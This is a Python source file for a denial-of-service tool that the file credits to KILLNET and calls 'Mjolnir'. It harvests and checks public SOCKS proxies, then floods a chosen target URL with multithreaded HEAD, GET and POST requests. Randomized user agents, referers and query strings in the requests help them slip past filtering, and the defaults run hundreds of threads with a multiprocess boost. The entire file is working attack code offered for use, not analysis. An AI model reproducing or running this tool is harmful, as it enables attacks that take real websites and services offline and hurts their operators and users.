#!/usr/bin/env python3

import os
import ctypes
import argparse
from socks import SOCKS4, SOCKS5
from abc import ABC, abstractmethod

libgcc_s = ctypes.CDLL('libgcc_s.so.1')


class PrxySrcAbs(ABC):
    def __init__(self, url, tp, timeout=5):
        self.url = url
        self.type = tp
        self.timeout = timeout

    def get_raw(self):
        from urllib.request import Request, urlopen
        try:
            with urlopen(Request(self.url,
                                 headers={'User-Agent': get_useragent()})) as resp:
                if resp.getcode() == 200:
                    return resp.read().decode('utf-8')
        except Exception as e:
            if verbose > 1:
                print('[!] Proxy source error: {}'.format(e))
            return ''

    @staticmethod
    def check_proxy(proxy, host, port, scheme, delay):
        from socks import socksocket
        from ssl import SSLContext
        sent = 0
        with socksocket() as sckt:
            try:
                sckt.set_proxy(proxy['type'], proxy['host'], proxy['port'])
                sckt.settimeout(delay)
                sckt.connect((host, int(port)))
                if scheme == "https":
                    sckt = SSLContext().wrap_socket(sckt, server_hostname=host)
                sent = sckt.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
                return proxy if sent > 0 else None
            except Exception as e:
                if verbose > 1:
                    print(e)
                return None
            finally:
                if verbose > 0:
                    if sent > 0:
                        print('    Proxy: {}:{} - OK'.format(proxy['host'], proxy['port']))
                    elif verbose > 1:
                        print('    Proxy: {}:{} - Fail'.format(proxy['host'], proxy['port']))

    @abstractmethod
    def process_data(self, rawdata):
        """"Abstract data"""

    def get_proxies(self, host, port, scheme):
        from concurrent.futures import ThreadPoolExecutor
        proxies = self.process_data(self.get_raw())
        if verbose > 0:
            print('[*] Checking: {} Total: {}'.format(self.url, len(proxies)))
        with ThreadPoolExecutor(threads) as executor:
            return [prxy for prxy in
                    executor.map(lambda x: PrxySrc.check_proxy(*x), [(p, host, port, scheme, self.timeout)
                                                                     for p in proxies])
                    if prxy is not None]


class PrxySrc(PrxySrcAbs):
    def process_data(self, rawdata):
        def get_proxy(prxy):
            dt = prxy.split(':')
            return {'host': dt[0], 'port': int(dt[1]), 'type': self.type}
        return [get_proxy(item) for item in str(rawdata).splitlines()]


class GeonodeProxy(PrxySrcAbs):
    def __init__(self, tp):
        PrxySrcAbs.__init__(self, 'https://proxylist.geonode.com/api/proxy-list?limit=1541&sort_by=lastChecked&' +
                                  'sort_type=desc&protocols={}'.format('socks4' if tp == SOCKS4 else 'socks5'), tp)

    def process_data(self, rawdata):
        from json import loads
        return [{'host': item['ip'], 'port': int(item['port']), 'type': self.type} for item in loads(rawdata)['data']]


class SocksProxyNet(PrxySrcAbs):
    def __init__(self):
        from socks import SOCKS4
        PrxySrcAbs.__init__(self, 'https://www.socks-proxy.net/', SOCKS4)

    def process_data(self, rawdata):
        def get_proxy(raw):
            try:
                dt = raw.split("</td><td>")
                return {'host': dt[0], 'port': int(dt[1]), 'type': self.type}
            except Exception as e:
                if verbose > 1:
                    print(e)
                return ''

        return [get_proxy(item)
                for item in
                rawdata.split("<tbody>")[1].split("</tbody>")[0].split("<tr><td>")]


PROXY_SRC = [
    GeonodeProxy(SOCKS4),
    SocksProxyNet(),
    GeonodeProxy(SOCKS5),
    PrxySrc('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all', SOCKS4),
    PrxySrc('https://www.proxy-list.download/api/v1/get?type=socks4', SOCKS4),
    PrxySrc('https://www.proxyscan.io/download?type=socks4', SOCKS4),
    PrxySrc('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt', SOCKS4),
    PrxySrc('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt', SOCKS4),
    PrxySrc('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt', SOCKS4),
    PrxySrc('https://api.proxyscrape.com/v2/?request=getproxies' +
            '&protocol=socks5&timeout=10000&country=all&simplified=true', SOCKS5),
    PrxySrc('https://www.proxy-list.download/api/v1/get?type=socks5', SOCKS5),
    PrxySrc('https://www.proxyscan.io/download?type=socks5', SOCKS5),
    PrxySrc('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt', SOCKS5),
    PrxySrc('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt', SOCKS5),
    PrxySrc('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt', SOCKS5),
    PrxySrc('https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt', SOCKS5)
]


def get_proxy_list(tp):
    fltr = {'mix': None, 'socks4': SOCKS4, 'socks5': SOCKS5}[tp]
    return PROXY_SRC if fltr is None else [src for src in PROXY_SRC if src.type == fltr]


ACCEPTALL = [
    '\r\n'.join(['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Language: en-US,en;q=0.5',
                 'Accept-Encoding: gzip, deflate']),
    'Accept-Encoding: gzip, deflate',
    '\r\n'.join(['Accept-Language: en-US,en;q=0.5',
                 'Accept-Encoding: gzip, deflate']),
    '\r\n'.join(['Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
                 'Accept-Language: en-US,en;q=0.5',
                 'Accept-Charset: iso-8859-1',
                 'Accept-Encoding: gzip']),
    '\r\n'.join(['Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
                 'Accept-Charset: iso-8859-1']),
    '\r\n'.join(['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1',
                 'Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1',
                 'Accept-Charset: utf-8, iso-8859-1;q=0.5']),
    '\r\n'.join(['Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, ' +
                 'application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
                 'Accept-Language: en-US,en;q=0.5']),
    '\r\n'.join(['Accept: text/html, application/xhtml+xml, image/jxr, */*',
                 'Accept-Encoding: gzip',
                 'Accept-Charset: utf-8, iso-8859-1;q=0.5',
                 'Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1']),
    '\r\n'.join(['Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, ' +
                 'image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
                 'Accept-Encoding: gzip',
                 'Accept-Language: en-US,en;q=0.5',
                 'Accept-Charset: utf-8, iso-8859-1;q=0.5']),
    '\r\n'.join(['Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
                 'Accept-Language: en-US,en;q=0.5']),
    '\r\n'.join(['Accept-Charset: utf-8, iso-8859-1;q=0.5',
                 'Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1']),
    '\r\n'.join(['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1']),
    '\r\n'.join(['Accept: text/plain;q=0.8,image/png,*/*;q=0.5',
                 'Accept-Charset: iso-8859-1']),
    'Accept: text/html, application/xhtml+xml',
    'Accept-Language: en-US,en;q=0.5']

REFERERS = [
    'https://www.google.com/search?q=',
    'https://check-host.net/',
    'https://www.facebook.com/',
    'https://www.youtube.com/',
    'https://www.fbi.com/',
    'https://www.bing.com/search?q=',
    'https://r.search.yahoo.com/',
    'https://vk.com/profile.php?redirect=',
    'https://www.usatoday.com/search/results?q=',
    'https://help.baidu.com/searchResult?keywords=',
    'https://steamcommunity.com/market/search?q=',
    'https://www.ted.com/search?q=',
    'https://play.google.com/store/search?q=',
    'https://www.qwant.com/search?q=',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.am/search?q=',
    'https://www.google.co.ao/search?q=']

STRINGS = 'asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&'


def get_random_ulr(path):
    from random import choice, randint
    return ('&' if '?' in path else '?').join([
        path, ''.join([choice(STRINGS), str(randint(0, 271400281257)), choice(STRINGS), str(randint(0, 271004281257)),
                       str(randint(0, 271004281257)), choice(STRINGS), str(randint(0, 271400281257)), choice(STRINGS),
                       str(randint(0, 271004281257))])])


def get_useragent():
    from random import randint, choice

    def get_os_version():
        return choice(choice([['68K', 'PPC', 'Intel Mac OS X'],
                              ['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1',
                               'Windows NT 5.2', 'Windows NT 6.0',
                               'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE',
                               'Windows XP', 'Windows 7', 'Windows 8',
                               'Windows NT 10.0; Win64; x64'],
                              ['Linux i686', 'Linux x86_64']]))

    def get_edge():
        webkit = '{}.{}'.format(randint(500, 599), randint(10, 99))
        chrome_ver = '{}.0.{}.{}'.format(randint(10, 99), randint(1000, 9999), randint(100, 999))
        edge_ver = '{}.{}'.format(randint(10, 99), randint(10000, 99999))
        return 'Mozilla/5.0 ({}) AppleWebKit/{}.0 (KHTML, like Gecko) Chrome/{} Safari/{} Edg/{}'\
               .format(get_os_version(), webkit, chrome_ver, webkit, edge_ver)

    def get_chrome():
        webkit = '{}.{}'.format(randint(500, 599), randint(10, 99))
        chrome_ver = '{}.0.{}.{}'.format(randint(10, 99), randint(1000, 9999), randint(100, 999))
        return 'Mozilla/5.0 ({}) AppleWebKit/{} (KHTML, like Gecko) Chrome/{} Safari/{}'\
               .format(get_os_version(), webkit, chrome_ver, webkit)

    def get_firefox():
        from datetime import date
        gecko_version = '{}{:02d}{:02d}'.format(randint(2020, date.today().year),
                                                randint(1, 12),
                                                randint(1, 30))
        firefox_version = '{}.0'.format(randint(10, 72))
        return 'Mozilla/5.0 ({}; rv:{}) Gecko/{} Firefox/{}'\
               .format(get_os_version(), firefox_version, gecko_version, firefox_version)

    def get_ie():
        msie_version = '{}.0'.format(randint(1, 99))
        token = choice(choice([['.NET CLR; ', 'SV1; ', 'Tablet PC; ', 'Win64; IA64; ', 'Win64; x64; ', 'WOW64; '],
                               ['']]))
        trident_version = '{}.0'.format(randint(1, 9))
        return 'Mozilla/5.0 (compatible; MSIE {}; {};{}Trident/{})'\
               .format(get_os_version(), msie_version, token, trident_version)

    return choice([get_chrome(), get_firefox(), get_ie(), get_edge()])


class AbsAttack(ABC):
    def __init__(self, scheme, host, port, path, cookies, custom_data):
        self.host = host
        self.port = port
        self.scheme = scheme
        self.path = path
        self.cookies = cookies
        self.data = custom_data

    @abstractmethod
    def get_attack_name(self):
        """"Supply name for verbose log"""

    @abstractmethod
    def get_content(self):
        """"Content to send"""

    @abstractmethod
    def communicate(self, content, proxy, on_proxy_request, multiply):
        """"Communication routine"""

    def attack(self, proxy, on_proxy_request, multiply):
        return self.communicate(self.get_content, proxy, on_proxy_request, multiply)


class AbsFastAttack(AbsAttack):
    @abstractmethod
    def get_attack_name(self):
        """"Supply name for verbose log"""

    @abstractmethod
    def get_content(self):
        """"Content to send"""

    def communicate(self, content, proxy, on_proxy_request, multiply):
        from ssl import SSLContext
        from socks import socksocket
        from socket import IPPROTO_TCP, TCP_NODELAY
        while 1:
            with socksocket() as sckt:
                try:
                    if proxy is not None:
                        sckt.set_proxy(proxy['type'], proxy['host'], proxy['port'])
                    else:
                        sckt.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                    sckt.connect((self.host, int(self.port)))
                    if self.scheme == "https":
                        sckt = SSLContext().wrap_socket(sckt, server_hostname=self.host)
                    for i in range(multiply):
                        cnt = content()
                        if verbose > 1:
                            print(cnt)
                        sent = sckt.send(str.encode(cnt))
                        if sent <= 0:
                            proxy = on_proxy_request()
                            break
                    if verbose > 0:
                        print('  -> {} - {}'.format(self.get_attack_name(), i))
                except Exception as e:
                    if verbose > 1:
                        print(e)


class AbsGetAttack(AbsFastAttack):
    @abstractmethod
    def get_attack_name(self):
        """"Supply name for verbose log"""

    @abstractmethod
    def get_type(self):
        """"Specific type for attack"""

    def get_content(self):
        from random import choice
        return '\r\n'.join([i for i in [
            self.get_type(),
            'Referer: {}{}{}'.format(choice(REFERERS), self.host, self.path),
            'User-Agent: {}'.format(get_useragent()),
            choice(ACCEPTALL),
            'Connection: Keep-Alive',
            'Cookies: {}'.format(self.cookies) if self.cookies is not None else None,
            '\r\n'] if i is not None])


class HeadAttack(AbsGetAttack):
    def get_attack_name(self):
        return 'HEAD'

    def get_type(self):
        return 'HEAD {} HTTP/1.1\r\nHost: {}'.format(get_random_ulr(self.path), self.host)


class CCAttack(AbsGetAttack):
    def get_attack_name(self):
        return ' CC '

    def get_type(self):
        return 'GET {} HTTP/1.1\r\nHost: {}'.format(get_random_ulr(self.path), self.host)


class SlowAttack(AbsAttack):
    def get_attack_name(self):
        return 'SLOW'

    def communicate(self, content, proxy, on_proxy_request, multiply):
        # TODO slowloris
        pass

    def get_content(self):
        # TODO slowloris
        pass


class PostAttack(AbsFastAttack):
    def get_attack_name(self):
        return 'POST'

    def get_content(self):
        from random import choice
        data = str(os.urandom(16)) if self.data is None else self.data
        return '\r\n'.join([i for i in [
            'POST {} HTTP/1.1',
            'Host: {}'.format(self.path, self.host),
            choice(ACCEPTALL),
            'Referer: {}://{}{}'.format(self.scheme, self.host, self.path),
            'Content-Type: application/x-www-form-urlencoded',
            'X-requested-with: XMLHttpRequest',
            'User-Agent: {}'.format(get_useragent()),
            'Content-Length: {}'.format(len(data)),
            'Cookies: {}'.format(self.cookies) if self.cookies is not None else None,
            'Connection: Keep-Alive', '\r\n', 'data'] if i is not None]) + '\r\n'


class DDoS:
    def __init__(self, attacks, proxy_sorces, multiply):
        self.attacks = attacks
        self.multiply = multiply
        self.error = {}
        self.proxies = [None] if proxy_sorces is None else [proxy for src in proxy_sorces for proxy
                                                            in src.get_proxies(attacks[0].host,
                                                                               attacks[0].port,
                                                                               attacks[0].scheme)]

    def on_proxy_request(self):
        from random import choice
        return choice(self.proxies)

    def activate(self):
        from random import choice
        from concurrent.futures import ThreadPoolExecutor
        if verbose > 0:
            print('[!] Attacking {} with total initial proxies {}'.format(self.attacks[0].host,
                                                                          len(self.proxies)))
        with ThreadPoolExecutor(threads) as executor:
            [executor.submit(choice(self.attacks).attack, choice(self.proxies), self.on_proxy_request, self.multiply)
             for _ in range(threads)]


def init(verb, num_threads):
    global verbose
    global threads
    verbose = verb
    threads = num_threads


def boost_activator(d_dos):
    d_dos.activate()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Mjolnir, the war-hammer of Thor. From KILLNET with love.')
    parser.add_argument('-a', '--attack', help='type of attack head/post/cc, default mix',
                        type=str, choices=['mix', 'head', 'post', 'cc'], default='mix')
    parser.add_argument('-p', '--proxy', help='socks proxy type version, default mix', type=str,
                        choices=['mix', 'socks4', 'socks5'], default='mix')
    parser.add_argument('-v', '--verbose', help='increase output verbosity', action='count', default=0)
    parser.add_argument('-b', '--brute', help='disable proxy usage', action="store_true")
    parser.add_argument('-d', '--data', help='custom data for POST attack', type=str)
    parser.add_argument('-B', '--boost', help='activate multiprocess mode', action='store_true')
    parser.add_argument('-c', '--cookies', help='custom cookies string', type=str)
    parser.add_argument('-t', '--threads', help='number of parallel threads, default 400', type=int, default=400)
    parser.add_argument('-m', '--multiply', help='magnification rate, default 100', type=int, default=100)
    parser.add_argument('-C', '--cc', help='add CC attack', action='store_true')
    parser.add_argument('-P', '--post', help='add POST attack', action='store_true')
    parser.add_argument('-H', '--head', help='add HEAD attack', action='store_true')
    parser.add_argument('target', help='target to attack', type=str)
    args = parser.parse_args()
    verbose = args.verbose
    threads = args.threads
    set_attacks = [i for i in [
        CCAttack if args.cc else None,
        HeadAttack if args.head else None,
        PostAttack if args.post else None
    ] if i is not None]

    if len(set_attacks) > 0:
        def strip_scheme(url):
            from urllib.parse import urlparse, ParseResult
            parsed_result = urlparse(url)
            return urlparse(args.target), ParseResult(*(('', '') + parsed_result[2:])).geturl()


        target, full_path = strip_scheme(args.target)
        if target.scheme and target.hostname:
            ddos = DDoS([attack(target.scheme,
                                target.hostname,
                                target.port if target.port is not None else 443 if target.scheme == 'https' else 80,
                                full_path if full_path is not None or full_path != '' else '/',
                                args.cookies,
                                args.data)
                         for attack in set_attacks],
                        None if args.brute else get_proxy_list(args.proxy),
                        args.multiply)
            if args.boost:
                from multiprocessing import Pool, cpu_count
                with Pool(cpu_count(), initializer=init, initargs=(verbose, threads)) as pool:
                    res = pool.map_async(boost_activator, [ddos for _ in range(cpu_count())])
                    res.get()
            else:
                ddos.activate()
        else:
            print('URL is not valid! Please provide a valid URL like http://www.example.com/index.html')
    else:
        print('It should be at least one attack option.')
